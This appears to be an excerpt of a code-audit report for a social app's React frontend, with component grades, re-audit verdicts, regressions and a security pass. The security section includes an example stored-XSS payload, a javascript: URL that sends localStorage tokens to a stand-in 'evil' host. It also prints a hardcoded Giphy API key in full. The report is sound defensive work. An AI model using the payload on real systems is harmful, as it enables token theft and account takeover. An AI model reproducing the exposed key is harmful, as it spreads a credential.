| ai/FriendDiscoveryScreen | D | Placeholder "coming soon" shipped as page; no nav |
| ai/SearchSparkleScreen | D | Placeholder "coming soon"; byte-for-byte twin of FriendDiscovery |

## 5. Grade overview — components (101)

### Shell / providers / primitives
| Component | Grade | Headline |
|---|---|---|
| App.tsx | B | Garbage CSS-as-classnames on splash; inline `<style>` dupes shimmer; pink splash hardcoded; duplicate `.dark` toggle; dead `/profile/:id` route; ~15 `console.log` in hot path |
| main.tsx | A | Clean; dev `console.log` only |
| index.css | D | Unlayered input reset kills focus (S4); `bg-white/*→#000 !important`; alpha-stripping; `.dark html` dead rules; 42 `!important`; ~120 dead lines; glass invisible in light; mixed px/rem scale @768 |
| App.css | D | 184 lines, **never imported** — delete |
| SafeLayout | B | `100vh` (not dvh) keyboard container; `border-white/5` invisible in light; inline styles in all 7 wrappers |
| Navbar | C | Mobile search/Plus are `div onClick` (no role/keyboard/cursor); bottom-nav icons unlabeled (no aria/aria-current); FAB/modal z-tie; bell no dark:; grid hub `hover:bg-white` flashes in dark |
| Sidebar | B | 72px rail vs `lg:ml-72`=288px offsets; hover expansion no onFocus/aria-expanded; popup clipped by `overflow-hidden`; CSS transition fights framer width |
| FloatingAction | C | **Font Awesome icons** (only FA in shell, 3 icon CDNs loaded); `z-[9999]` above modal scrims; "+" navigates to Messages outside compose; unlabeled; labels hover-only |
| FloatingAIButton | C | Dead (commented out); would cover content at bottom-center; `z-999` inconsistent |
| FloatingRewardWidget | D | `bg-white/10 text-gray-200` invisible in light; no z-index; hover styles on non-interactive div |
| GlobalThemeProvider | B | `height:100%` against auto `#root`; whole wrapper inline styles; duplicate `.dark` writer; safe-area deps `[theme]` only |
| LoadingBar | B | Fake timer (400ms→90%) not tied to real readiness; no `role="progressbar"` |
| ErrorBoundary | B | No reset/retry; fallback (ErrorPage) broken in dark |
| StatusBarController | A | Clean |
| NetworkStatusProvider | B | `console.log` per change; offline handlers skip `updateConnectionStatus` (stale quality); 3G→saveData (permanent low-res images) |
| OfflineIndicator | C | No `role="status"`/`aria-live` (offline announced to nobody); `top:4rem` ≠ 72px header (paints over glass header); `sm:` switch vs `md:hidden` header; `z-9999` hidden behind most modals; no dismiss |
| OTAUpdateProvider | C | `useOta` has **zero consumers** (polls every 30s to show nothing); remount-key full-tree remount then reload; overlay no aria-live; inline styles + 4th spinner language |
| PullToRefreshProvider | D | Guard always true (container never scrolls) → refresh fires mid-drag anywhere; indicator behind navbar; double content shift (flow+transform); transform drags fixed chrome; `100vh`; no aria-live |
| ProgressiveImage | C | Root has no height → skeleton never shows in aspect cells; force-loaded flag hides shimmer (blank gap); `loading="eager"` after spread (overrides lazy); error text 2.3:1; injects **global shimmer keyframes** (3rd definition); dead `props.style` |
| AppScreen | B- | Inline `100vh`; all-inline styles; no `overscroll-behavior:contain`; duplicated light bg hex; only 2 pages use it |
| ui/CountdownTimer | C | `rose-500` on `rose-50` 3.35:1 @10px, no dark:; `null` first second (CLS); no `role="timer"`; digit jitter |
| ui/ModernOfflineState | D | `text-gray-900` on dark bg **1.07:1** (invisible in dark) — used in 8 places; `bg-secondary/20` class doesn't exist; fixed dots escape the component; infinite bounce no reduce-motion; `RotateCw` as error icon; `min-h-400px` |
| ui/Spinner | B+ | **Only accessible spinner** (`role="status"`, motion-safe) — but bypassed by 46 raw `animate-spin` in 29 files; fullscreen `bg-white/80` no dark: |
| ErrorBoundary (above) | | |

### Feed / social
| Component | Grade | Headline |
|---|---|---|
| PostCard | D | **Tapping comment/share counts likes the post** (row-level onClick); 38 tsc errors; portal dropdown no off-screen clamp; 11 alert/confirm/prompt; comment label above bookmark; 0 aria; dead icon imports |
| VirtualizedFeed | C | Not virtualized (mounts all; 280px skeleton → CLS); scroll restore `window.scrollTo` no-op; leftover `console.log`; double spacing math with Dashboard |
| UserCard | C | `div onClick` card; `onRemove` prop accepted but never used; `text-black/40` metadata; 4th formatCount copy |
| MentionInput | C | Portal autocomplete: no listbox role, **no keyboard nav** (arrows/enter/esc); full-screen sheet + backdrop `z-[10001]` even on desktop; hard `bg-white`, 0 dark: |
| FollowRequestsOverlay | D | `z-50` under chrome; **accept/reject hover-only → invisible on touch**; duplicate of pages/FollowRequests w/ different field names; no dialog semantics |
| Avatar | C | `size` keys outside union (tsc); no width/height (CLS); no guaranteed alt fallback |
| MentionText | B | Mentions link `to="#"` (page jump); no hashtag detection; no `rel` |
| PostModal | C | No dialog role/trap/Escape; emoji appends to end not caret; objectURL leak; 2× autoFocus conflict; dead `animate-in` classes |
| PostCommentsModal | C | Body-scroll lock no-op (wrong scroller) + restores `'unset'`; `isExpanded` never set (comments permanently clamped); **GIPHY key in bundle**; `window.location.href` nav; 22px emoji targets |
| PostOptionsModal | C | 10 native alert/confirm/prompt; no dialog semantics; duplicates PostCard dropdown w/ different handlers |
| ShareModal | B | "More" button no onClick; share failures console-only; "Loading…" text not skeleton; no dialog role |
| FeelingActivitySelector | B | No Escape/trap; dead `animate-in` classes; mislabeled "Loading followers" (fetches following); own z-[99999] shell |
| FollowListModal | D | `z-[100]` under chrome (sidebar clickable above modal); "Remove" fakes removal client-side; hard `#262626` always-dark; fetch errors → empty list |
| UserActionModal | C | 30px buttons; `text-[8px]`; AnimatePresence around always-mounted children (exit never plays); z-5000 scale; emoji poke icon |
| MediaPreviewModal | C | Hard `bg-white` menu in dark lightbox; report button dead; `<video autoPlay>` without `muted` (audio blast); no Escape |
| NoteEditorModal | D | **GIF click overwrites entire note**; hide-checkbox id mismatch; GIPHY key in bundle; dead Search button; duplicate Try Again/OK; body class undefined |
| ProfileShareModal | D | Sheet `z-100/101` **behind bottom nav** (Copy unclickable on mobile); 0 dark:; "shop/Marketplace" copy on any profile; external QR leaks URLs |
| SettingsModal | C | Raw `<style>` always-light + Instagram-blue palette; 3/4 tabs "coming soon"; "Change photo" dead; **2nd competing Settings UI**; `localStorage.clear()` logout |
| NewChatModal | C | 0 dark:; **Bootstrap Icons CDN** (`bi bi-*`) vs lucide everywhere; rows `div onClick`; no fetch loading/error; search undebounced |
| ArchiveModal | C | Body lock no-op; `autoPlay` without muted; `window.confirm`; `text-white/10–20` labels; aspect-ratio cells ✓ (good pattern) |
| ReshareModal | C | 4th mention-autocomplete (same keyboard gaps); always-light `<style>`; counter 1.5:1; 9 tsc errors; fake video preview |

### Messaging / calls
| Component | Grade | Headline |
|---|---|---|
| chat/CameraModal | C | No getUserMedia failure UI (black box + live shutter); mode/color swatches cosmetic; 0 aria/Escape |
| chat/ChatSettingsModal | C | Backdrop **opaque `bg-black`**, no click-outside/Escape; `z-200` under chrome; native confirm/alert/prompt; emoji `perLine` from `window.innerWidth` (overflows panel); hardcoded "9m" fake presence |
| chat/ForwardModal | B | No safe-area on bottom sheet; MAX_SELECT=5 silent no-op; small tabs; cleanest modal in slice |
| chat/GifMessage | B | No aspect box (CLS); no alt; dead (never imported) |
| chat/MessageActionModals | C | `MessageMoreModal` framer `y:-50%` overrides `-translate-x-1/2` → runs off right edge; emoji-picker CSS leaked **globally** (`width:100vw !important`); z-100–121 under chrome; 0 aria |
| chat/MessageBubble | B | Dead (never imported; Messages.tsx inlines its own); click div w/o keyboard; magic sizes duplicated |
| chat/PrivacySettingsModal | C | AnimatePresence never plays exit; 24px toggle w/o switch role; no dialog semantics; loads with default values then flips |
| chat/ReplyPreview | B | Weak `?` placeholder; `alt="img"`; only file with an aria-label |
| chat/SwipeableMessage | C | `setPointerCapture` steals vertical scroll (no `touch-action`); unclamped offset (bubble off-screen); dead (never imported) |
| forward/ForwardHeader | B | Conflicting `bg-[#111]+bg-white/10`; unlabeled back; prop contract mismatch with consumer |
| forward/ForwardListItem | C | Imports non-existent `ChatItem` type; dead + API drift; no listbox semantics |
| forward/ForwardSearchBar | A | Clean; unused `debounced` var |
| CallOverlay | C | `LocalPreview h-full` squeezes layout; no safe-area; z-9999/99999 off-scale; most call buttons unlabeled; injected `<style>` per render; infinite animations |
| MockCallProvider | C | Context rebuilt every render (1s re-render storm); failed call logged twice; speaker defaults ON; no aria-live |
| PresenceManager | B | Reconnect toast `top:10px` covers navbar; no `role="status"`; inline spin animation; no dismiss |
| modals/MessageActionModal | D | `if(!isOpen) return null` **above** AnimatePresence (exit never runs); 3rd parallel menu impl, dead; double scrim z-9999; glass rows fail light-mode |

### Moments / stories / video
| Component | Grade | Headline |
|---|---|---|
| SparkleLiveHero | B | Rewards clustered at 0/45/90° (`i/8` with 3 items); oval rings; duplicate SVGs; **reduced-motion handled ✓** (only file) |
| TikTokHearts | C | No reduce-motion guard; `Math.random()` in animate → hearts jump every render; timeouts never cleared; z-99999 over toasts |
| GlobalEffects | C | `.video-error-placeholder` has no CSS; fallback image path 404s; interval observers forever; no aria on injected nodes |
| HlsVideoPlayer | D | `poster` never applied (black frame); **pause resets video to 0:00** (active toggle → load+seek 0); fatal errors silent; no captions |
| VideoPlayer | B | No poster/aspect (black flash + CLS); mixed vh/px max-h; autoplay failure console-only |
| stories/AddYoursSticker | B | `cursor-grab` in view mode; `text-black/20` count; magic-% clipping; duplicate click targets |
| stories/AvatarLoopSticker | C | Hardcoded -100px loop (seam jump); infinite marquee no reduce-motion; empty-pill possible |
| stories/PollSticker | B | **Votes never increment → 0%/0% after voting**; `text-black/40`; no aria-pressed |
| stories/ReactionSticker | B | `config.count` never displayed; no aria-pressed |
| stories/StickerPicker | B | Hard `bg-white` forced-light; z-10000 ad-hoc; 32px close; "My/Recent" tabs always empty; no Escape |
| stories/StickerRenderer | D | **Drag double-applies offset** (drifts off-canvas each drag); magic-% top-left anchor + no clamp; blocked by StoryViewer z-order; gesture-only (no keyboard); text `✕` delete |
| video/LocalPreview | C | Switch-camera ≈20×20px (most-tapped control); `title` only; `text-white/50` fails when cam off |
| video/RemotePlaceholder | C | **Dead (never imported)**; `/placeholder-avatar.png` 404s; blur halo; no reduce-motion |
| modals/MomentShareModal | C | Dead `animate-in` (plugin absent); hard `bg-white`/`bg-blue-600`; 0 aria; wrong social glyphs; grid overflow @375px |
| modals/CreateHighlightModal | B | Errors console-only (sheet hangs); cells `div onClick`; `text-white/20–40`; blue CTA ignores primary; z-10001 |
| modals/HighlightPlayerModal | B | No env() insets fullscreen; unlabeled 20px controls; z-10002; fixed 5s dwell; **keyboard nav ✓** |

### Marketplace
| Component | Grade | Headline |
|---|---|---|
| marketplace/MarketplaceInbox | C | **3 stacked sticky headers** with hardcoded offsets (tabs hide behind page header); `100vh-60px` ignores bottom nav (last rows under nav); row menu clipped by overflow; selectedChat/unread never set (dead styles/badges); alt="" images; search centered |
| modals/ListingModal | C | Remove-photo hover-only (touch-invisible); labels `text-black/30` 10px; **pink spinner on pink button (invisible)**; unassociated labels; global `.modal-inner` style leak; "Black Market" category option |
| modals/MarketplaceModals | D | ~8 dead controls (share targets, Hide/Block, Use Current Location, inbox tabs/filters); **double-nested empty state** (double scroll/padding); mounted twice (w/ App); alert×4; three overlay tiers; min>max accepted; naive slug routes |
| modals/MarketplaceSettingsModal | C | `z-200` under nav; dead toggles/select (Private Shop, Add Method, ticket cards); alert/prompt ×7; wrong icons (`TrendingUp` as send); slate/indigo ≠ marketplace palette; crashes on missing `provider`/`engagement_rate`; duplicates MarketplaceSettings page |

### Community / gamification / admin
| Component | Grade | Headline |
|---|---|---|
| Leaderboard | C | Hardcoded Alice/Bob/Carol; dark-only card; no loading/empty/error |
| AnalyticsDashboard | C | All stats `mockStats` (fake in prod); `text-pink-200` on white 1.7:1; `key={i}` |
| AnalyticsCard | B- | `exit` without AnimatePresence; `bg-white/5` invisible in light |
| AchievementGrid | B- | Progress bars no `role="progressbar"`; dark-assumed palette; state by color only |
| RewardVault | B- | Hardcoded tiers; dark-assumed; hover rotateY no reduce-motion |
| RewardCarousel | D | 8 fixed items in `overflow-hidden` → **clipped & unreachable** past ~800px; not a carousel (one-shot fade); emoji artwork; dark-only |
| RewardIcon | C | Glow `absolute inset-0` but wrapper **not `relative`** (escapes); hardcoded glow hex |
| GiftBox | B- | Hover-scale only; duplicated inline boxShadow; fixed brand fill |
| MilestoneTracker | C | Placeholder "XP coming soon" shipped; dark-assumed; no data |
| ProgressMilestone | B | No progressbar role; white text on `bg-#120b22/40` unreadable in light; emoji in status |
| MicrophoneShowcase | D | Imports **`three`/`@react-three/*` not installed** → build/lazy failure; no reduce-motion; OrbitControls steals scroll; 0.6rem labels |
| modals/GroupInviteModal | B | Failures console-only; no dialog semantics; hard `bg-white`; no toast/close after success |
| modals/GroupPostModal | C+ | Backdrop closes **during upload** (work discarded); errors console-only; 24px remove button; light-only; CTA text mismatch |
| modals/GroupSettingsModal | B- | alert/confirm; `window.location.href` full reload; 4 unlabeled member-action buttons; toggles w/o switch role; cover change hover-only; exit without AnimatePresence |
| modals/EventModal | C+ | alert() validation; unassociated labels; `placeholder:text-black/5` invisible; light-only; redefines spin keyframes |
| modals/PollModal | C+ | Toggles are divs; failures console-only; light-only; no dialog; index-keyed options |
| modals/ConfessionModal | B- | `alert()` on failure; `text-[8px]`+1.6:1 subtitle; light-only; no char counter; layout jump on attach |
| modals/SkillDetailModal | C- | **`loading → null` (blank flash); error → modal never opens** (looks dead); fabricated fallbacks ("5.0", canned review); per-mount fonts; z-10000 |
| modals/SkillOfferModal | A- | Per-mount Google Fonts; `alert()` validation; no dialog; negative price accepted |
| modals/IdentityVerificationModal | D | z-250/600 **under chrome** (nav paints over camera); sheet no max-height; capture targets are divs; fake 4s progress + setTimeout success; `text-black/20`; light-only |
| modals/CreationHubModal | C | Local `<style>` retimes **global** `.animate-fade-in/.animate-scale-in/spin-slow` app-wide while open; `text-black/10–25` labels; no dialog; z-10000; `lowercase` wrapper fights children |
| camera/CameraProvider | B | **Flash never applies torch** (button lies); **capture ignores zoom** (preview≠photo); background-return black preview; recorder errors console-only |
| camera/CameraPreview | B | CSS-only zoom (see above); double tap-fire (touch+click); zoom badge collides with REC pill; no starting/error UI |
| camera/CameraControls | B- | Footer 304px > 295px available @375px; mode row 128px content box for 246px labels (edge-clipped); **13 buttons, 0 aria-labels**; `text-white/40` 3.7:1; `pt-14` no env(); 0 cursor-pointer; "live" mode takes a photo |
| camera/CameraPermissionsManager | C | No dialog semantics/focus; "Don't Allow" = `history.back()` (dumps flow); iOS alert imitation on Android; `hasPermission=false` conflates any failure; 3.9:1 descriptions |

<!-- AUDIT-DETAIL-A -->

## Appendix A — Pass 8 re-audit (2026-10-07, HEAD `ab69111`)

**Why:** the §3–§5 lists were written 2026-10-04 against `82edc92`; 8 fix batches and 215 changed files landed since, and security/env integrity were never audited. Four parallel **static** passes (no browser, per project constraint): **A.1/A.2** P0 + P1 staleness · **A.3** code-delta defects · **A.4** security · **A.5** route/control/form/env integrity. All line numbers re-verified against HEAD.

### A.1 — §3 P0 verdicts (18 items)

| # | Item | Verdict | Evidence (HEAD) |
|---|---|---|---|
| 1 | PostDetail `clsx` | ✅ FIXED | `PostDetail.tsx:9` (added `187288c`); was 0 imports at audit base |
| 2 | LockedLivePage `followers` | ✅ FIXED | `LockedLivePage.tsx:54` declared; all refs in scope |
| 3 | input reset unlayered | ❌ BROKEN | `index.css:340-342` unlayered `border-none`; `@layer base` opens after at `:346` (line drifted from 327 by H20 insert) |
| 4 | `@theme` marketplace tokens | ❌ BROKEN | `index.css:12-24` — no `--color-marketplace-*`/`--color-secondary`/`--bg-main`; 0 defs repo-wide; **299 usages/12 files** |
| 5 | 10 overlays + FAB z | ❌ BROKEN | 11/11 values unchanged: FollowRequests `z-50` (:54), Notifications `z-50` (:564), FollowList `z-[100]` (:74), ProfileShare `z-[100/101]` (:83,:90), Support `z-[100]` (:192), PollDetail `z-[100/110]` (:311,:360), IdentityVerification `z-[250/251/600]` (:416,:423,:103), ChatSettings `z-[200]` (:367,:507), SellItem `z-[60]` (:265), MarketplaceSettings `z-[200]` (:119), FAB `z-[9999]` (`FloatingAction.tsx:27`) vs chrome `z-1100/1000` (`Navbar.tsx:87,:119`, `Sidebar.tsx:66`) |
| 6 | MarketplaceModals double mount | ❌ BROKEN | `App.tsx:421` + `Marketplace.tsx:434`; 3s polling still at `MarketplaceModals.tsx:47-50` |
| 7 | PostCard row onClick likes on count tap | ❌ BROKEN | rows `PostCard.tsx:609-615`,`:645-650`; counts `:639-640`,`:683-691` no `stopPropagation`; `handleSpark` `:142-167` |
| 8 | HlsVideoPlayer reset/poster | ❌ BROKEN | `HlsVideoPlayer.tsx:114` `load()`, `:118` `currentTime=0`; no `poster` attr on `<video>` `:124-137` |
| 9 | StickerRenderer drift | ❌ BROKEN | `StickerRenderer.tsx:60-69` commits % but never resets motion x/y (0 `set(0)` hits); style `:86-97` double-applies |
| 10 | FollowRequests hover-only buttons | ❌ BROKEN | `FollowRequestsOverlay.tsx:93` `opacity-0 group-hover`, no `focus-within`/touch path |
| 11 | Confessions dead route | ⚠️ PARTIAL | route exists (`App.tsx:468`) + backend `GET /confessions/:id` (`ab69111`) but `Confessions.tsx` reads **no param** (0 `useParams|useSearchParams`); `navigate` `:311`, share uses `?id=` `:174` |
| 12 | Help FAQ hover-only | ❌ BROKEN | `Help.tsx:68-74` no onClick; CSS `:149/:151` `display:none`→`block` on hover; untouched since pre-audit |
| 13 | MarketplaceSettings error/rollback | ❌ BROKEN | `:76` `if (!settings) return null` hides error banner `:89-94`; optimistic `:52-53` not rolled back in `catch` `:60-62` |
| 14 | MicrophoneShowcase `three` deps | ✅ FIXED* | deps in root `package.json:34,35,78`, resolve via walk-up; `dist/MicrophoneShowcase-*.js` 920 KB built, 0 bare imports. *Caveat: not declared in `frontend/package.json` — declare to de-risk |
| 15 | ErrorPage dark crash + keyframes | ❌ BROKEN | global `@keyframes pulse` override `ErrorPage.tsx:50-54`; `text-[#2D3436]`/`[#636E72]` `:16,:19` on card forced `#000` by `index.css:197-200` → ~1.9:1 |
| 16 | NoteEditor GIF/checkbox | ⚠️ PARTIAL | GIF overwrite still: `:399` `setNote(gif.title…)` replaces all (vs append `:370`); checkbox **gone** (row rewritten as button `:249-258`) → id mismatch N/A |
| 17 | MessageMoreModal transform + CSS leak | ❌ BROKEN | framer inline `transform` vs Tailwind v4 `translate` property double-applies → `Y=-100%` (`MessageActionModals.tsx:122-127`); unscoped `<style>` `:194-220` forces `em-emoji-picker` to `100vw` app-wide |
| 18 | VERSION string + Google/Resend | ⚠️ PARTIAL | `Login.tsx:364` `VERSION 3.0.2` still shipped; Google still dead (`Signup.tsx:317-321`, no handler); Resend ✅ wired (`Signup.tsx:583`+handler `:231-245`; `Login.tsx:494`+`:199-211`) |

**Tally: 3 fixed / 13 broken / 3 partial (11, 16, 18).** Fix batches touched these files only for H15/H16 `logger` swaps, the H20 `#root:has(...)` offset, H22 text-inheritance, resend wiring, and dead-file deletion — no z-index, `@layer`, `@theme`, modal-mount, or affordance changes.

### A.2 — §4/§5 P1 systemic spot-check (verdicts)

- **`--z-*`/`--header-h`/`--rail-w` tokens, z-literal codemod:** NOT DONE — 0 hits for the tokens; literals still ad-hoc (`Navbar` 1100/1000, `IdentityVerificationModal` 600, FAB 9999, `TikTokHearts`/`FeelingActivitySelector` 99999).
- **`100vh`→`100dvh`:** NOT DONE — 26 `100vh` in `.tsx` vs 2 `100dvh` (both pre-existing); `.h-screen-safe` 0 usages; `index.css:176,:304` unchanged.
- **`<MotionConfig reducedMotion="user">` + global reduce-motion block:** NOT DONE — 0 `MotionConfig` hits; `index.css` has no `prefers-reduced-motion`; only per-page media queries (Login/Signup/Forgot, `OnboardingSheet`).
- **`interactive-widget=resizes-content`:** NOT DONE — `index.html:6` viewport meta unchanged → keyboard still covers chat composer.
- **~60 native dialogs → toast:** NOT DONE — actually **140** native dialog calls now (A.5.4); no shared ConfirmDialog.
- **Dead-code sweep:** PARTIAL — `f445fac` deleted `ForwardMessage` + `forward/*` + `NewChatModal` (verified gone); still dead: `App.css` (0 importers), `MessageBubble`, `SwipeableMessage`, `GifMessage`, `PrivacySettingsModal`, `RemotePlaceholder`(+css), `FloatingAIButton`, `modals/MessageActionModal`, `AnalyticsDashboard` (0 importers, mockStats), `Leaderboard` (0 importers).
- **Fonts/keyframes hoist:** NOT DONE — component `<style>` keyframes remain in ≥10 files (ProgressiveImage, VirtualizedFeed, ErrorPage, Confessions, Memories, PollDetail, Verified, Messages, ResetPassword, AccountsCenter).
- **`.pt-safe/.pb-safe/.pl-safe`:** pre-date the audit (`6704328`) — the only P1 token work that exists.

### A.3 — Code-delta defects (frontend changes 2026-10-04 → HEAD)

Nothing new is a P0-crash, but the window introduced 1 P1 + 5 P2 regressions/holes:

1. **[P1] Renewed/2FA JWTs drop the `role` claim → admin nav vanishes.** `auth.middleware.js:85-91` (H26 renewal) and `auth.controller.js:394-399` (`verify2FA`) sign `{userId,email,username,tokenVersion}` **without `role`** — while `services/auth.service.js:12` (`login`/`refresh`) includes it. `Sidebar.tsx:47,56` re-derives role from the token only → Admin entry disappears at first renewal (~7.5 min) or from the start via 2FA; `App.tsx:438-439` also mis-routes `/login`/`/signup` redirects. **Fix:** add `role: user.role` to both signs (or read role from the user store).
2. **[P2] `x-refresh-token` not CORS-exposed → H26 adoption no-op.** `server.js:54-79` sets no `exposedHeaders`; `tokenHeaderSync.ts:15-24` reads `h['x-refresh-token']` → always `null` cross-origin (Vercel→Render *and* dev via `.env.local`). **Fix:** `exposedHeaders: ['x-refresh-token']`.
3. **[P2] Moments lost its rail offset (H20 regression).** Of 35 `lg:ml-72` removals across 30 files, exactly 5 sit under Moments' `fixed` root (`Moments.tsx:1067`) where `#root` padding can't reach: `:1103` (top bar), `:1138` (viewer/search `z-2000`), `:1354` (empty state), `:1367` (slide), `:1388`. Rail (`Sidebar.tsx:66`, `z-[1000]`) covers the left 72px of reels; overlays paint over the sidebar. **Fix:** restore `lg:ml-72`/`lg:pl-72` on those 5.
4. **[P2] Onboarding slide 2 unreachable.** `Onboarding.tsx:16` starts at 1; every setter (`:35,:37,:39,:41,:66,:71,:120,:127-149,:172`) writes 1/3/4/5/6 — **never 2**; branch `:124-130` dead; label `:98` "Step {min(n,5)} of 5" jumps 1→3, bar `:83` 0%→40%. **Fix:** route through 2 (and `:135` back→2) or delete `Slide2` + relabel 4 steps.
5. **[P2] Ghost Mode initial state always "visible".** `Settings.tsx:65` seeds `is_hidden` from `user`, but login/2FA payloads (`auth.controller.js:246-261`, `:424-437`) never include `is_hidden`, and it's write-only server-side (`user.controller.js:616`). Hidden accounts read "👁 Profile is currently visible" (`:522`). **Fix:** fetch `GET /users/me` on sheet open or include `is_hidden` in the payload.
6. **[P2] `/confessions/:id` param never read** — see A.1 #11 (route+backend shipped; frontend ignores it; two competing URL schemes `/:id` vs `?id=`).
7. **[P3]** Onboarding path-based sheet detection is dead code (`Onboarding.tsx:24-26` never runs; 4 sheet routes render bare `OnboardingSheet`, `App.tsx:556-559`).
8. **[P3]** Slide2 white-on-white text in light theme (`Slide2.tsx:33,37` vs `Onboarding.tsx:103` white card) — latent until #4 fixed.
9. **[P3]** Rail offset relies on `:has()` (`index.css:310-314`) → Firefox <121 loses offset entirely (needs `@supports` fallback).
10. **[P3]** Socket prep-connect retries forever every 5 s with always-on `logger.warn` (`socketService.ts:67-68`) — unbounded prod log noise; needs backoff+cap.
11. **[P3]** Stale renewal header can overwrite a newer token (`tokenHeaderSync.ts:37-45` — segment-count check only, no `exp` comparison) — compare `exp` before adopting.
12. **[P3]** Success-toast timer not cleared on unmount (`Settings.tsx:151`, no ref/cleanup) — pattern exists at `:85-89`.
13. **[P3]** Eager `OnboardingSheet` import (998 lines) defeats the lazy-route batch (`App.tsx:111` vs ~90 lazy peers; `Suspense` already wraps at `:430-434`).
14. **[P3]** Account-Control sheet `z-50` backdrop+drawer (`Settings.tsx:394,:399`) below rail `z-[1000]` → rail stays lit/clickable while sheet open; raise to `z-[1500]`.

Also verified clean in the window: new endpoints exist (`user.routes.js:62-64`, `auth.routes.js:37-48`); deleted files have 0 dangling refs; providers mounted once; no new hardcoded runtime URLs.

### A.4 — Security pass (12 issues + 8 safe)

**High**
1. **Stored XSS via `javascript:` hrefs.** Sinks: `Messages.tsx:4393-4396` (`msg.media_url` doc links), `SharedContentExplorer.tsx:315` (files), `:375` (links), `:576` (media download). Source: `messages.controller.js:263,277-279` stores `media_url`/`type` verbatim; Files/Media endpoints echo it (`:1056-1097`, `:991-1020`). Exploit: `POST /messages/send {type:'document', media_url:"javascript:fetch('https://evil/?c='+localStorage…)"}` → victim clicks attachment → token theft + takeover. **No mitigations:** no CSP on Vercel SPA (`vercel.json` no headers, no meta CSP), Helmet CSP covers only Express origin with `unsafe-inline`. **Fix:** `^https?://` guard in all 4 anchors + reject non-http(s) schemes in `sendMessage`.
2. **All-account tokens in `localStorage` + immortal signup key.** `userStore.ts:182-194` persists `{token, refreshToken, accounts[]}` via `capacitorStorage.ts:7-18` → web build = `localStorage['CapacitorStorage.user-storage']`. `Signup.tsx:178-180` writes `sparkle_signup_{token,refresh,user}` — **never read, never removed** (logout `Settings.tsx:197-209` doesn't clear them). Backend httpOnly cookie (`auth.controller.js:233-240`) is nullified by body-returned duplicate. → P1 architecture: cookie-only refresh, purge signup keys on logout.

**Medium**
3. **OTA hash never verified.** `OtaService.ts:114-180` accepts `expectedHash` but performs 0 digest comparisons — downloads `bundleUrl` JS and injects it pre-React (`:62-75`). **Fix:** `crypto.subtle.digest('SHA-256')` and refuse mismatches; sign `version+hash` server-side.
4. **No SRI / no CSP.** `index.html:14,15,20` — cdnjs font-awesome, jsdelivr bootstrap-icons, tiktok `embed.js`, no `integrity`; `vercel.json` has no `headers`. **Fix:** CSP headers in `vercel.json` (`script-src 'self'`, `object-src 'none'`, `frame-ancestors 'self'`), pin/self-host the 3 CDN assets.
5. **Tokens in prod logs.** `App.tsx:263,267` pass raw Axios errors to `logger.warn` → carries `config.headers.Authorization` + `x-refresh-token`; `logger.ts:15-16` warn/error unconditional; `ErrorBoundary.tsx:27` same. **Fix:** log redacted `{status,url}` shims.
6. **`window.open` tabnabbing** — P0 #26 above.
7. **SW `api-cache` survives logout.** `vite.config.ts:38-46` caches `/api/*` NetworkFirst 24h; logout (`Settings.tsx:197-209`) never touches `caches.*` (0 hits) → next account served the previous account's feed/inbox while offline. **Fix:** delete `api-cache*` + sweep user-data keys on logout.

**Low**
8. Giphy key `V4AnAfCCCGEVjlUjiNMWWXCoW1JrAn4p` hardcoded in `NoteEditorModal.tsx:21`, `PostCommentsModal.tsx:184`, `Messages.tsx:677` — same value as the **backend** `.env` key, verified present in `dist`. **Fix:** `VITE_GIPHY_API_KEY` client-only key (pattern already in `MarketplaceChat.tsx:26`).
9. Email + 6-digit OTP in URL query (`api.ts:177`, `Signup.tsx:103`, `ResetPassword.tsx:10-16`) → history/logs/Referer leakage. **Fix:** POST body + `Referrer-Policy: no-referrer`.
10. Client file type/size validation absent on most uploads (`accept` only: ListingModal `:119`, SellItem `:161`, PostModal `:408`, GroupPostModal `:242`, ConfessionModal `:244`, CameraModal `:98-104`) — server gates it, so defence-in-depth only.
11. TikTok iframe no `sandbox` (`MomentDetail.tsx:143-149`) — origin pinned, but top-navigation capable.
12. Object URLs: 23 `createObjectURL` vs 17 `revokeObjectURL` (Messages 4/0, PostModal 2/0, + eight 1/0 files) → memory leak on long sessions.

**Safe near-misses (verified, no action):** S1 both `dangerouslySetInnerHTML` = static CSS (CallOverlay:145, MessageActionModals:194); S2 lone `innerHTML` = literal (`GlobalEffects.tsx:30`); S3 zero `eval`/`new Function`/`javascript:`/`document.write` in `src`; S4 `SparklyMarkdown` regex-locks `http(s)` (`:26`); S5 chat Links tab scheme-restricted server-side (`messages.controller.js:1165-1172`); S6 profile website `https://`-forced (`Profile.tsx:589`); S7 no `?next=` redirect, `navigate()` fails closed cross-origin; S8 no `postMessage` listeners, no real secret in `dist` (Supabase/Pexels/VAPID/Firebase absent).

### A.5 — Route / control / form / env integrity

**A.5.1 Dead links — 16 hits in 8 files** (closest declared route in parens; all 8 files reachable from `App.tsx`):

| Target | file:line | Nearest route |
|---|---|---|
| `/accounts-center` | `pages/Settings.tsx:297` | `/settings/accounts` (`App.tsx:549`) |
| `/marketplace/messages` | `pages/SellerProfile.tsx:87` | `/marketplace/messages/:conversationId` (`:481`) |
| `/settings/privacy` | `components/chat/ChatSettingsModal.tsx:445` | `/settings` / `/legal/:documentId` |
| ``/clubs/${id}/settings`` | `pages/ClubDetail.tsx:195` | none (mirror `/groups/:id/settings` `:465`) |
| `/stories` | `OfficialInteractiveOnboarding.tsx:53`, `OfficialWelcomeCards.tsx:40` | `/stories/:userId` / `/afterglow/create` |
| `/music` | `OfficialInteractiveOnboarding.tsx:62` | none (nearest `/streams` `:532`) |
| `/ai/study` | `pages/ai/SparkleAIScreen.tsx:11` | commented out `App.tsx:566` |
| `/ai/captions` | `SparkleAIScreen.tsx:12` | `/ai/caption` commented `:567` |
| `/ai/bio` | `SparkleAIScreen.tsx:13` | commented `:568` |
| `/settings/profiles` | `AccountsCenter.tsx:26` (nav `:136`) | `/settings/advanced/:section` |
| `/settings/details` | `AccountsCenter.tsx:33` | `/settings` |
| `/settings/ads` | `AccountsCenter.tsx:34` | `/settings/advanced/:section` |
| `/settings/emails` | `AccountsCenter.tsx:40` | `/settings` |
| `/settings/devices` | `AccountsCenter.tsx:41` | `/settings/security` |
| `/settings/recovery` | `AccountsCenter.tsx:42` | `/settings/change-password` |

Not dead: `MarketplaceChat.tsx:862` (concatenation, resolves), `href="#"` sentinels (0 real), OnboardingSheet anchors (all have `id` targets).

**A.5.2 Orphan routes (declared, zero inbound):** `/settings/accounts` (only blocked by dead `/accounts-center`), `/lost-found`, `/wishlist`, `/follow-requests`, `/settings/audio-diagnostics`.

